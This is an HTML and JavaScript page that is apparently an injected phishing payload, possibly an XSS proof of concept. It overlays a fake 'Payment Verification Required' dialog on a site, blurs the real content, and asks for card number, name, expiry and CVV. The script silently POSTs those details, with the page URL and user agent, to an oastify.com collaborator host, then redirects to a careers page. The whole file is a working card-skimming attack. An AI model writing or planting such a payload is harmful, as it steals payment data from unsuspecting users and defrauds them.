<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Verification Required</title>
    <style>
        /* Hide legitimate content during attack */
        header, main, footer {
            filter: blur(2px);
            pointer-events: none;
            user-select: none;
        }

        /* Style for the phishing overlay */
        .phishing-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 99999;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .phishing-container {
            background: white;
            width: 350px;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0,0,0,0.2);
        }

        .phishing-input {
            width: 100%;
            padding: 12px;
            margin: 8px 0 15px;
            box-sizing: border-box;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }

        .phishing-button {
            background-color: #d23f00;
            color: white;
            padding: 14px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            font-size: 16px;
            transition: background-color 0.3s;
        }

        .phishing-button:hover {
            background-color: #b23700;
        }

        .security-note {
            font-size: 12px;
            color: #666;
            margin-top: 20px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .input-group {
            display: flex;
            gap: 10px;
        }
        .input-group > * {
            flex: 1;
        }
    </style>
</head>
<body>
    <!-- Your existing page content would be here -->
    
    <script>
        // Create fake payment overlay
        const fakePayment = document.createElement('div');
        fakePayment.className = 'phishing-overlay';
        fakePayment.innerHTML = `
            <div class="phishing-container">
                <h2 style="color:#d23f00; margin-top: 0;">Payment Verification Required</h2>
                <p style="margin-bottom: 20px;">We've detected unusual activity. Please verify your payment method to continue:</p>
                
                <input type="text" id="phish-cardnum" placeholder="Card Number" class="phishing-input" maxlength="19">
                <input type="text" id="phish-cardname" placeholder="Name on Card" class="phishing-input">
                
                <div class="input-group">
                    <input type="text" id="phish-expiry" placeholder="MM/YY" class="phishing-input">
                    <input type="text" id="phish-cvv" placeholder="CVV" class="phishing-input" maxlength="4">
                </div>
                
                <button id="phish-submit" class="phishing-button">Verify Payment Method</button>
                <p class="security-note">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="#666">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h2v2h-2v-2zm0-12h2v10h-2V5z"/>
                    </svg>
                    Your information is secured with 256-bit encryption
                </p>
            </div>
        `;
        
        document.body.appendChild(fakePayment);
        
        // Format card number input (add spaces every 4 digits)
        document.getElementById('phish-cardnum')?.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
            e.target.value = formatted.substring(0, 19);
        });
        
        // Format expiry date (auto-insert slash)
        document.getElementById('phish-expiry')?.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value.substring(0, 5);
        });
        
        // Submit handler
        document.getElementById('phish-submit')?.addEventListener('click', function() {
            try {
                const cardNum = document.getElementById('phish-cardnum').value;
                const cardName = document.getElementById('phish-cardname').value;
                const expiry = document.getElementById('phish-expiry').value;
                const cvv = document.getElementById('phish-cvv').value;
                
                // Show processing animation
                fakePayment.innerHTML = `
                    <div class="phishing-container" style="text-align: center;">
                        <div style="margin: 20px 0 30px;">
                            <svg width="50" height="50" viewBox="0 0 38 38" xmlns="http://www.w3.org/2000/svg" stroke="#d23f00">
                                <g fill="none" fill-rule="evenodd">
                                    <g transform="translate(1 1)" stroke-width="2">
                                        <circle stroke-opacity=".5" cx="18" cy="18" r="18"/>
                                        <path d="M36 18c0-9.94-8.06-18-18-18">
                                            <animateTransform attributeName="transform" type="rotate" from="0 18 18" to="360 18 18" dur="1s" repeatCount="indefinite"/>
                                        </path>
                                    </g>
                                </g>
                            </svg>
                        </div>
                        <p style="margin-bottom: 0;">Verifying your payment details...</p>
                    </div>`;
                
                // Send data to attacker server (silently fails if blocked)
                fetch('https://5synx55etlldi0ogs08w4pg25tbkzkn9.oastify.com/phish', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        card_number: cardNum,
                        card_name: cardName,
                        expiry_date: expiry,
                        cvv: cvv,
                        origin: window.location.href,
                        user_agent: navigator.userAgent,
                        timestamp: new Date().toISOString()
                    }),
                    mode: 'no-cors'
                }).catch(() => {});
                
                // Redirect after 3 seconds
                setTimeout(() => {
                    window.location.href = 'https://careers.thetradedesk.com';
                }, 3000);
                
            } catch (e) {
                console.error('Error:', e);
                window.location.href = 'https://careers.thetradedesk.com';
            }
        });
    </script>
</body>
</html>
